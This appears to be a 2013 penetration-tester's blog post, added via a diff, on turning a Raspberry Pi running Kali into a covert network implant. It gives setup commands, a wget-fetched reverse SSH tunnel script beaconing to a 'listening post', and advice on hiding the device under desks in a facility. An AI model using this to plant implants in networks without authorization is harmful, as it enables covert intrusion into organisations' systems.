@@ -1,0 +1,244 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Building a Network Implant with a Raspberry Pi and Kali - cubalo</title>
+  <meta name="author" content="Matt">
+
+  
+  <meta name="description" content="Tweet Building a Network Implant With a Raspberry Pi and Kali I recently received my Raspberry Pi Model B from Element 14 and was trying to come up &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://cubalo.github.io/blog/2013/04/06/building-a-network-implant-with-a-raspberry-pi-and-kali/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="cubalo" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">cubalo</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">cubalo</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">Ramblings of an OFFSEC grunt</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/mchandx/">twitter</a>
+  </li>
+
+
+  <li class="link">
+    <a href="http://github.com/mchandx/">github</a>
+  </li>
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:cubalo.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/2013/04/06/building-a-network-implant-with-a-raspberry-pi-and-kali/" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/2013/04/06/building-a-network-implant-with-a-raspberry-pi-and-kali/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">Building a Network Implant With a Raspberry Pi and Kali</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-06T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+<p>I recently received my <a href="http://www.newark.com/jsp/search/productdetail.jsp?sku=43W5302&amp;COM=raspi-group">Raspberry Pi Model B from Element 14</a> and was trying to come up with a creative way to use it. I looked around the internet and found a bunch of people doing some really cool stuff like <a href="http://www.daveakerman.com/?p=592">sending their RPis into space</a> and building <a href="http://moccapi.blogspot.co.uk/">automated coffee machines</a>, but nothing really sparked my interest. Pwnplugs are expensive. The Raspberry Pwn script is cool, but doesn&#8217;t fit all of my needs. I heard that Kali Linux is supported on the Raspberry Pi and it seemed like a match made in heaven so I figured why not turn it into a drop box and have it try to connect back out to me. Although it won&#8217;t have all the cool tunneling and filter evasion stuff that a Pwnplug or Powerpwn has, it should get the job done.</p>
+<h2>Shopping list</h2>
+<ul>
+<li><a href="http://www.newark.com/jsp/search/productdetail.jsp?sku=43W5302&amp;COM=raspi-group">Raspberry Pi Model B</a> - $35 + S&amp;H</li>
+<li>Case of your choosing (I like the <a href="https://www.adafruit.com/products/1124">Ninja Pibow</a> though a plain black case with no components exposed would be more discreet) - $20 + S&amp;H</li>
+<li>Micro USB charging cable (5.0v @ 700 mA) - $5</li>
+<li>HDMI cable - &gt;$10</li>
+<li>RPi compatible SDHC card (Lexar Platinum II 8GB, Class 6) - $20 from Target   Note: NOT ALL SDHC ARE COMPATIBLE!</li>
+<li><a href="http://www.amazon.com/Microsoft-Wired-Keyboard-200-Business/dp/B004SUILFO/">USB Keyboard</a> - $10</li>
+<li>Cat5e ethernet cable - I&#8217;m sure you have one around there somewhere&#8230;</li>
+<li>OPTIONAL:</li>
+<li><a href="http://www.amazon.com/Netgear-Wireless-Micro-Adapter-WNA1000M/dp/B004VDR37K/">Micro-sized wireless dongle</a> - $25</li>
+<li>USB Mouse - $15</li>
+</ul>
+<h1>Download and Install Kali</h1>
+<p>First, download the Kali image for Raspberry Pi from <a href="http://cdimage.kali.org/kali-images/kali-linux-1.0-armel-raspberrypi.img.gz">here</a>.</p>
+<p>Then unzip the image.</p>
+<pre>gunzip kali-linux-1.0-armel-raspberrypi.img.gz</pre>
+<p>Check the name of your SD card.</p>
+<pre>df -h</pre>
+<p>If using the SDHC card I posted above, it should be a 8.0GB filesystem at /dev/mmcblk0</p>
+<p>Unmount the SD card so that data can be written to it</p>
+<pre>umount /dev/mmcblk0</pre>
+<p><em>Change /dev/mmcblk0 to reflect whatever your SD card&#8217;s name is</em></p>
+<p>Then use dd to write the Raspbian .img to the SD card.</p>
+<pre>sudo dd bs=512k if=kali-linux-1.0-armel-raspberrypi.img of=/dev/mmcblk0</pre>
+<p><em>Change /dev/mmcblk0 to reflect the name of your SD card again. dd does not display its status, so if you are concerned that is has stopped working, start up top and see if it is running (or try ps xfaw | grep dd)</em></p>
+<p>Once dd has completed, eject the SD card and plug it into the RPi&#8217;s SD card slot. Then attach the HDMI cable to your monitor of choice and the RPi&#8217;s port as well as the USB keyboard and ethernet cable. Then connect the power cable and watch the device boot up. When you reach a command prompt, you&#8217;re all set and have verified the OS is working. Default creds at root / toor.</p>
+<h2>Resizing the SDHC card</h2>
+<p>It has been reported that the image may not take up the full SDHC card and you&#8217;ll be left with a bunch of useless space. I haven&#8217;t experienced the issue except with the soft-float wheezy image, but if you do, here&#8217;s how to fix that.</p>
+<p>This will install the raspi-config script the Raspbian ships with. This includes &#8220;expand_rootfs&#8221; which will tell the file system to use the full available space on the SD card.</p>
+<pre><code style="font-size: 12px; line-height: 18px;">wget http:</code><code style="font-size: 12px; line-height: 18px;">//archive</code><code style="font-size: 12px; line-height: 18px;">.raspberrypi.org</code><code style="font-size: 12px; line-height: 18px;">/debian/pool/main/r/raspi-config/raspi-config_20121028_all</code><code style="font-size: 12px; line-height: 18px;">.deb</code>
+<code style="font-size: 12px; line-height: 18px;">wget http:</code><code style="font-size: 12px; line-height: 18px;">//http</code><code style="font-size: 12px; line-height: 18px;">.us.debian.org</code><code style="font-size: 12px; line-height: 18px;">/debian/pool/main/l/lua5</code><code style="font-size: 12px; line-height: 18px;">.1</code><code style="font-size: 12px; line-height: 18px;">/lua5</code><code style="font-size: 12px; line-height: 18px;">.1_5.1.5-4_armel.deb</code>
+<code style="font-size: 12px; line-height: 18px;">wget http:</code><code style="font-size: 12px; line-height: 18px;">//http</code><code style="font-size: 12px; line-height: 18px;">.us.debian.org</code><code style="font-size: 12px; line-height: 18px;">/debian/pool/main/t/triggerhappy/triggerhappy_0</code><code style="font-size: 12px; line-height: 18px;">.3.4-2_armel.deb</code>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">dpkg -i triggerhappy_0.3.4-2_armel.deb</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">dpkg -i lua5.1_5.1.5-4_armel.deb</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">dpkg -i raspi-config_20121028_all.deb</span></pre>
+<p>Finally, run the following command to get started.</p>
+<pre>raspi_config</pre>
+<p>Then just run the expand_rootfs script. This should take some time. Once it&#8217;s completed, just reboot and carry on.</p>
+<h2>Make some basic configuration changes</h2>
+<p>First, make sure you change the default root password to something difficult to guess.</p>
+<pre>passwd</pre>
+<p>Turn on SSH.</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">/etc/init.d/ssh start</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">update-rc.d ssh enable</span></pre>
+<p>Create yourself a non-root user.</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">adduser $WHATEVER</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">su $WHATEVER</span></pre>
+<p>If you want, you can have Metasploit start up on boot. (I would wait and do this manually as needed.)</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">service postgresql start</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">service metasploit start</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">update-rc.d postgresql enable</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">update-rc.d metasploit enable</span></pre>
+<h1>Setup SSH</h1>
+<p>Install autossh</p>
+<pre>apt-get -y install autossh</pre>
+<p>Then use wget to pull down a script from Github that will setup the tunneling for us.</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">wget </span><a style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;" href="http://github.com/mikeymckay/reverse_ssh_tunnel/raw/master/setup_reverse_tunnel.sh">http://github.com/mikeymckay/reverse_ssh_tunnel/raw/master/setup_reverse_tunnel.sh</a>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">chmod +x ./setup_reverse_tunnel.sh</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">./setup_reverse_tunnel.sh</span></pre>
+<p>Before running the script, however, there are a few key piece of information that you should know before the script asks for them:</p>
+<ul>
+<li>Middle-man server: This is your listening post, the host that will sit out on the internet waiting for connections from your devices. This should just be a public IP address.</li>
+<li>Middle-man server user: This is the user you will use to login to the listening post. SHOULD NOT BE ROOT! Make sure to create a new SSH user in the sudoers/wheel group.</li>
+</ul>
+<p>Finally, run the following commands from the middleman server as well as the Pi respectively:</p>
+<pre><span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">ssh-copy-id root@middlemanserver</span>
+<span style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;">ssh-copy-id root@yourpi</span></pre>
+<h1>Operations</h1>
+<p>Upon entering a facility, find a ethernet port with access out to the internet (more common than you&#8217;d think) as well as a standard wall outlet unless you have a battery pack. Plug both cables into their respective ports and walk out.</p>
+<p>My favorite locations are under conference room tables, copy rooms, secretary desks, and common areas such as &#8220;touchdown spaces.&#8221;</p>
+<p>Once the device is planted and assuming it has a connection out, it should automatically connect to your listening post and you now have a presence inside the network.</p>
+<h1>Conclusion</h1>
+<p>And just like that, you have a network implant that will beacon out to you over and SSH tunnel as soon as it gets and internet connection. It would be great if you could combine with with an EC2 micro instance so that you don&#8217;t have to sacrifice an laptop and could have an &#8220;always on&#8221; device.</p>
+<p>I&#8221;m sure I&#8217;ve forgotten some things and some parts may need some more detail or not work altogether. I will update this page as I work out those bugs.</p>
+<p>Credit to T. Bradley for the idea as well as Mikey McKay for the auto-tunnel script!</p>
+<p>[caption id=&#8221;attachment_61&#8221; align=&#8221;alignnone&#8221; width=&#8221;300&#8221;]<img alt="Raspberry Pi with the Ninja PiBow Case" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/rpwn-300x169.jpg" width="300" height="169" /> Raspberry Pi with the Ninja PiBow Case[/caption]</p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
